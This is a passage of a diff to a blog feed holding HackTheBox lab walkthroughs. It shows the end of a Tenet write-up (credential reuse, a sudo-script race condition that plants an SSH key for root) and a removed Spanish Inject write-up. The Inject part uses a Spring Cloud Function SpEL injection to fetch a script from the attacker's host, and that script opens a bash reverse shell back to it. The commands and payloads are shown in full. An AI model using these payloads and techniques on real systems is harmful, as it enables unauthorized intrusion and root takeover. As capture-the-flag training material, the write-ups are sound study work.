+
+/<span class="k">*</span> That<span class="s1">'s all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( '</span>ABSPATH<span class="s1">' ) ) {
+	define( '</span>ABSPATH<span class="s1">', __DIR__ . '</span>/<span class="s1">' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . '</span>wp-settings.php<span class="s1">'; 
+</span></code></pre></div></div>
+
+<ul>
+  <li>The credentials are for the database but as such if we try to migrate to the <code class="language-plaintext highlighter-rouge">neil</code> user we see that <code class="language-plaintext highlighter-rouge">Opera2112</code> works.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@tenet:/var/www/html/wordpress<span class="nv">$ </span>su neil
+Password: 
+neil@tenet:/var/www/html/wordpress<span class="nv">$ </span><span class="nb">whoami
+</span>neil
+neil@tenet:/var/www/html/wordpress<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span>
+neil@tenet:/var/www/html/wordpress<span class="nv">$ </span>
+</code></pre></div></div>
+
+<h2 id="usertxt">User.txt</h2>
+
+<ul>
+  <li>Here we can see the first flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+0b85a9967e410892bb32b0628e11989f
+neil@tenet:~<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<ul>
+  <li>We have this privilege at the <code class="language-plaintext highlighter-rouge">sudoers</code> level.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>neil on tenet:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>
+
+User neil may run the following commands on tenet:
+    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/enableSSH.sh
+neil@tenet:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>If we run it we see this.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/enableSSH.sh
+Successfully added root@ubuntu to authorized_keys file!
+neil@tenet:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>We see this.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~<span class="nv">$ </span><span class="nb">cat</span> /usr/local/bin/enableSSH.sh
+<span class="c">#!/bin/bash</span>
+
+checkAdded<span class="o">()</span> <span class="o">{</span>
+
+	<span class="nv">sshName</span><span class="o">=</span><span class="si">$(</span>/bin/echo <span class="nv">$key</span> | /usr/bin/cut <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f</span> 3<span class="si">)</span>
+
+	<span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-z</span> <span class="si">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="si">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+
+		/bin/echo <span class="s2">"Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!"</span>
+
+	<span class="k">else</span>
+
+		/bin/echo <span class="s2">"Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!"</span>
+
+	<span class="k">fi</span>
+
+<span class="o">}</span>
+
+checkFile<span class="o">()</span> <span class="o">{</span>
+
+	<span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-s</span> <span class="nv">$1</span> <span class="o">]]</span> <span class="o">||</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+
+		/bin/echo <span class="s2">"Error in creating key file!"</span>
+
+		<span class="k">if</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> /bin/rm <span class="nv">$1</span><span class="p">;</span> <span class="k">fi
+
+		</span><span class="nb">exit </span>1
+
+	<span class="k">fi</span>
+
+<span class="o">}</span>
+
+addKey<span class="o">()</span> <span class="o">{</span>
+
+	<span class="nv">tmpName</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-u</span> /tmp/ssh-XXXXXXXX<span class="si">)</span>
+
+	<span class="o">(</span><span class="nb">umask </span>110<span class="p">;</span> <span class="nb">touch</span> <span class="nv">$tmpName</span><span class="o">)</span>
+
+	/bin/echo <span class="nv">$key</span> <span class="o">&gt;&gt;</span><span class="nv">$tmpName</span>
+
+	checkFile <span class="nv">$tmpName</span>
+
+	/bin/cat <span class="nv">$tmpName</span> <span class="o">&gt;&gt;</span>/root/.ssh/authorized_keys
+
+	/bin/rm <span class="nv">$tmpName</span>
+
+<span class="o">}</span>
+
+<span class="nv">key</span><span class="o">=</span><span class="s2">"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"</span>
+addKey
+checkAdded
+neil@tenet:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/web14.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/web15.png" />
+</p>
+
+<ul>
+  <li>If we look at the script and execute this which stores <code class="language-plaintext highlighter-rouge">tmpName</code> it creates a temporary value.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~<span class="nv">$ </span><span class="nb">mktemp</span> <span class="nt">-u</span> /tmp/ssh-XXXXXXXX
+/tmp/ssh-ui1c8x0m
+neil@tenet:~<span class="nv">$ </span><span class="nb">mktemp</span> <span class="nt">-u</span> /tmp/ssh-XXXXXXXX
+/tmp/ssh-KH7vkHSO
+</code></pre></div></div>
+
+<ul>
+  <li>The first thing we are going to do is to create a key pair.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh-keygen <span class="nt">-f</span> /root/id_rsa <span class="nt">-N</span> <span class="s2">""</span>
+Generating public/private ed25519 key pair.
+Your identification has been saved <span class="k">in</span> /root/id_rsa
+Your public key has been saved <span class="k">in</span> /root/id_rsa.pub
+The key fingerprint is:
+SHA256:LL4/EFhSOqu9HhJp6tvZ64JW0lJtanWVb1PbNdMymQk root@miguelos
+The key<span class="s1">'s randomart image is:
++--[ED25519 256]--+
+|     ..   . E. +.|
+|    ...  o   .*oo|
+|    ++  . . . oo+|
+|   o.*.o   + . . |
+|  * = o.S . .    |
+| = O ...         |
+|. O o ..         |
+|.o.ooo ..        |
+|.o.+=+o...       |
++----[SHA256]-----+
+</span></code></pre></div></div>
+
+<ul>
+  <li>Now we copy it.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>id_rsa.pub | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip
+</code></pre></div></div>
+
+<ul>
+  <li>And we run a loop with our public key.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~<span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do for </span>filename <span class="k">in</span> /tmp/ssh-<span class="k">*</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEiM/fMXvCoQX988QWZre1S9ZG5Kguv/ root@miguelos"</span> <span class="o">&gt;</span> <span class="nv">$filename</span><span class="p">;</span><span class="k">done</span><span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Now from another window we connect via <strong>SSH</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh neil@10.10.10.223
+The authenticity of host <span class="s1">'10.10.10.223 (10.10.10.223)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:atDC5N+fRDvKKwKE6Y6GZN4MdRAr5aHD24UsVrZ4+ts.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.10.223<span class="s1">' (ED25519) to the list of known hosts.
+neil@10.10.10.223'</span>s password:
+Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-129-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Jul  4 01:04:47 UTC 2024
+
+  System load:  0.95               Processes:             178
+  Usage of /:   15.3% of 22.51GB   Users logged <span class="k">in</span>:       0
+  Memory usage: 11%                IP address <span class="k">for </span>ens160: 10.10.10.223
+  Swap usage:   0%
+
+
+53 packages can be updated.
+31 of these updates are security updates.
+To see these additional updates run: apt list <span class="nt">--upgradable</span>
+
+
+Last login: Thu Dec 17 10:59:51 2020 from 10.10.14.3
+neil@tenet:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+neil@tenet:~<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>And we execute.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/enableSSH.sh
+</code></pre></div></div>
+
+<h2 id="shell-as-root-and-roottxt">Shell as root and root.txt</h2>
+
+<ul>
+  <li>After several attempts we succeeded login with ssh because it is a <code class="language-plaintext highlighter-rouge">race condition</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@tenet:~# <span class="nb">cat</span> /root/root.txt
+74e3750ae90e0db4c09df869028cabca 
+</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Hawk (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/07/02/hawk.html" rel="alternate" type="text/html" title="HackTheBox - Hawk (medium)" /><published>2024-07-02T00:00:00-06:00</published><updated>2024-07-02T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/07/02/hawk</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/07/02/hawk.html"><![CDATA[<p align="center">
 <img src="https://labs.hackthebox.com/storage/avatars/72d59997b352994c628a2b58b022b1d0.png" />
 </p>
 
@@ -8795,472 +9489,4 @@ root@wifinetic:/#
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@wifinetic:~# <span class="nb">cat </span>root.txt
 82e27401ce5bb1d85196562913c72da9
-</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Inject (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject.html" rel="alternate" type="text/html" title="HackTheBox - Inject (easy)" /><published>2024-06-02T00:00:00-06:00</published><updated>2024-06-02T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject.html"><![CDATA[<p align="center">
-<img src="https://labs.hackthebox.com/storage/avatars/285ba8819710b6ae1f67bc0e5914ffd9.png" />
-</p>
-
-<ul>
-  <li>Inject is an Easy Difficulty Linux machine featuring a website with file upload functionality vulnerable to Local File Inclusion (LFI). By exploiting the LFI vulnerability, files on the system can be enumerated, revealing that the web application uses a specific version of the <code class="language-plaintext highlighter-rouge">Spring-Cloud-Function-Web</code> module susceptible to <code class="language-plaintext highlighter-rouge">CVE-2022-22963</code>. Exploiting this vulnerability grants an initial foothold as the <code class="language-plaintext highlighter-rouge">frank</code> user. Lateral movement is achieved by further file enumeration, which discloses a plaintext password for <code class="language-plaintext highlighter-rouge">phil</code>. A cronjob running on the machine can then be exploited to execute a malicious <code class="language-plaintext highlighter-rouge">Ansible</code> playbook, ultimately obtaining a reverse shell as the <code class="language-plaintext highlighter-rouge">root</code> user.</li>
-</ul>
-
-<h2 id="portscan">PortScan</h2>
-
-<ul>
-  <li>Comenzamos escaneando los puertos abiertos y sus servicios por el protocolo <strong>TCP</strong>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,8080 10.10.11.204 <span class="nt">-oN</span> targeted
-Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-02 11:53 CST
-Nmap scan report <span class="k">for </span>10.10.11.204
-Host is up <span class="o">(</span>0.084s latency<span class="o">)</span><span class="nb">.</span>
-
-PORT     STATE SERVICE     VERSION
-22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-| ssh-hostkey:
-|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 <span class="o">(</span>RSA<span class="o">)</span>
-|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f <span class="o">(</span>ECDSA<span class="o">)</span>
-|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d <span class="o">(</span>ED25519<span class="o">)</span>
-8080/tcp open  nagios-nsca Nagios NSCA
-|_http-title: Home
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</code></pre></div></div>
-
-<h2 id="enumeración-y-lfi">Enumeración y LFI</h2>
-
-<ul>
-  <li>Vemos las versiones que esta corriendo el servicio web que al parecer no son muchas.</li>
-</ul>
-
-<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.204</span><span class="p">:</span><span class="mi">8080</span>
-<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.204</span><span class="p">:</span><span class="mi">8080</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Content</span><span class="o">-</span><span class="no">Language</span><span class="p">[</span><span class="n">en</span><span class="o">-</span><span class="no">US</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">Frame</span><span class="p">,</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.204</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Home</span><span class="p">],</span> <span class="no">YouTube</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Esta es la pagina web.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/1.png" />
-</p>
-
-<ul>
-  <li>En la parte de <strong>register</strong> no vemos nada importante.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/2.png" />
-</p>
-
-<ul>
-  <li>La parte de <strong>blogs</strong> funciona y vemos algunos usuarios.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/3.png" />
-</p>
-
-<ul>
-  <li>Sin embargo hay una ruta que se llama <strong>/upload</strong> la cual esta si funciona.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/4.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Vamos a subir un archivo cualquiera en este caso un <code class="language-plaintext highlighter-rouge">.txt</code>.</p>
-  </li>
-  <li>
-    <p>Sin embargo aunque lo subamos nos da esta respuesta.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/5.png" />
-</p>
-
-<ul>
-  <li>Si probamos con una imagen funciona.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/6.png" />
-</p>
-
-<ul>
-  <li>Podemos ver la imagen y la <code class="language-plaintext highlighter-rouge">url</code> es interesante.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/7.png" />
-</p>
-
-<ul>
-  <li>Vamos a capturar la petición con <code class="language-plaintext highlighter-rouge">burpsuite</code> al momento de abrir la imagen y si probamos un LFI vemos que funciona.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/8.png" />
-</p>
-
-<ul>
-  <li>Hay 2 usuarios.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/9.png" />
-</p>
-
-<ul>
-  <li>Si vemos lo que hay dentro del directorio de <code class="language-plaintext highlighter-rouge">frank</code> encontramos esto.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/10.png" />
-</p>
-
-<ul>
-  <li>Aquí vemos una contraseña y un <code class="language-plaintext highlighter-rouge">.xml</code> con información.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/11.png" />
-</p>
-
-<blockquote>
-  <p>La contraseña no funciona para conectarnos por SSH.</p>
-</blockquote>
-
-<blockquote>
-  <p>El archivo de configuración que ha mostrado pertenece a Maven, que es una herramienta de gestión y comprensión de proyectos de software. Este archivo específico se usa para configurar ajustes relacionados con la construcción y gestión de proyectos en Maven By ChatGPT.</p>
-</blockquote>
-
-<ul>
-  <li>Vemos que ya nos hablan de <code class="language-plaintext highlighter-rouge">Java</code>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/12.png" />
-</p>
-
-<ul>
-  <li>Vemos un <code class="language-plaintext highlighter-rouge">WebApp</code> con archivos interesantes.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/13.png" />
-</p>
-
-<ul>
-  <li>Si le decimos a <code class="language-plaintext highlighter-rouge">ChatGPT</code> a que corresponden esos archivos nos dice que pertenecen a Maven.</li>
-</ul>
-
-<blockquote>
-  <p>La imagen que has proporcionado muestra una lista de archivos y directorios que son comunes en un proyecto de Java utilizando Maven como sistema de gestión y construcción de proyectos.</p>
-</blockquote>
-
-<h2 id="spring-cloud-function">Spring Cloud Function</h2>
-
-<ul>
-  <li>En el archivo <code class="language-plaintext highlighter-rouge">pom.xml</code> encontramos información incluye dependencias, propiedades del proyecto y configuraciones especificas de compilación.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/14.png" />
-</p>
-
-<ul>
-  <li>Nos da la versión que se esta utilizando para la biblioteca <code class="language-plaintext highlighter-rouge">spring-cloud-function-web</code> con versión <code class="language-plaintext highlighter-rouge">3.2.2</code>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/15.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Esta versión es vulnerable <a href="https://nsfocusglobal.com/spring-cloud-function-spel-expression-injection-vulnerability-alert/">https://nsfocusglobal.com/spring-cloud-function-spel-expression-injection-vulnerability-alert/</a>.</p>
-  </li>
-  <li>
-    <p>Aquí nos explican en que consiste y como se explota <a href="https://sysdig.com/blog/cve-2022-22963-spring-cloud/">https://sysdig.com/blog/cve-2022-22963-spring-cloud/</a>.</p>
-  </li>
-  <li>
-    <p>Al parecer aprovecha de <code class="language-plaintext highlighter-rouge">Runtime.getRuntime().exec()</code> que es un método en Java para ejecutar comandos.</p>
-  </li>
-  <li>
-    <p>Para ver si es vulnerable vamos hacer una petición con <code class="language-plaintext highlighter-rouge">curl</code>  a la ruta <code class="language-plaintext highlighter-rouge">functionRouter</code> lo que vamos hacer es crear un archivo en el directorio <code class="language-plaintext highlighter-rouge">/tmp</code>.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/17.png" />
-</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
-Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
-<span class="k">*</span>   Trying 10.10.11.204:8080...
-<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
-<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
-<span class="o">&gt;</span> Host: 10.10.11.204:8080
-<span class="o">&gt;</span> User-Agent: curl/8.5.0
-<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
-<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"touch /tmp/pwned"</span><span class="o">)</span>
-<span class="o">&gt;</span> Content-Length: 4
-<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
-<span class="o">&gt;</span>
-&lt; HTTP/1.1 500
-&lt; Content-Type: application/json
-&lt; Transfer-Encoding: chunked
-&lt; Date: Sun, 02 Jun 2024 18:52:19 GMT
-&lt; Connection: close
-&lt;
-<span class="k">*</span> Closing connection
-<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T18:52:19.471+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>%                                   
-</code></pre></div></div>
-
-<ul>
-  <li>Si comprobamos desde el <strong>LFI</strong> vemos que efectivamente se creo.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/inject/16.png" />
-</p>
-
-<h2 id="shell-as-frank">Shell as frank</h2>
-
-<ul>
-  <li>Para obtener una <code class="language-plaintext highlighter-rouge">shell</code> vamos a crear un <code class="language-plaintext highlighter-rouge">.sh</code> que contenga una reverse <code class="language-plaintext highlighter-rouge">shell</code> y lo vamos a compartir mediante un servidor http con python3 para poder descargarlo en la maquina victima y hacer una petición al archivo.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>reverse.php
-<span class="c">#!/bin/bash</span>
-bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.55/443 0&gt;&amp;1
-➜  content python3 <span class="nt">-m</span> http.server 80
-Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora nos ponemos en escucha.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
-listening on <span class="o">[</span>any] 443 ...
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora subimos el archivo a la máquina.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl http://10.10.14.55:80/reverse.sh -o /tmp/reverse.sh")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
-Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
-<span class="k">*</span>   Trying 10.10.11.204:8080...
-<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
-<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
-<span class="o">&gt;</span> Host: 10.10.11.204:8080
-<span class="o">&gt;</span> User-Agent: curl/8.5.0
-<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
-<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"curl http://10.10.14.55:80/reverse.sh -o /tmp/reverse.sh"</span><span class="o">)</span>
-<span class="o">&gt;</span> Content-Length: 4
-<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
-<span class="o">&gt;</span>
-&lt; HTTP/1.1 500
-&lt; Content-Type: application/json
-&lt; Transfer-Encoding: chunked
-&lt; Date: Sun, 02 Jun 2024 18:58:15 GMT
-&lt; Connection: close
-&lt;
-<span class="k">*</span> Closing connection
-<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T18:58:15.168+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora le damos permisos de ejecución.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("chmod +x /tmp/reverse.sh")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
-Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
-<span class="k">*</span>   Trying 10.10.11.204:8080...
-<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
-<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
-<span class="o">&gt;</span> Host: 10.10.11.204:8080
-<span class="o">&gt;</span> User-Agent: curl/8.5.0
-<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
-<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"chmod +x /tmp/reverse.sh"</span><span class="o">)</span>
-<span class="o">&gt;</span> Content-Length: 4
-<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
-<span class="o">&gt;</span>
-&lt; HTTP/1.1 500
-&lt; Content-Type: application/json
-&lt; Transfer-Encoding: chunked
-&lt; Date: Sun, 02 Jun 2024 18:59:10 GMT
-&lt; Connection: close
-&lt;
-<span class="k">*</span> Closing connection
-<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T18:59:10.711+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Y por ultimo lo ejecutamos para obtener <code class="language-plaintext highlighter-rouge">shell</code>.</li>
-</ul>
-
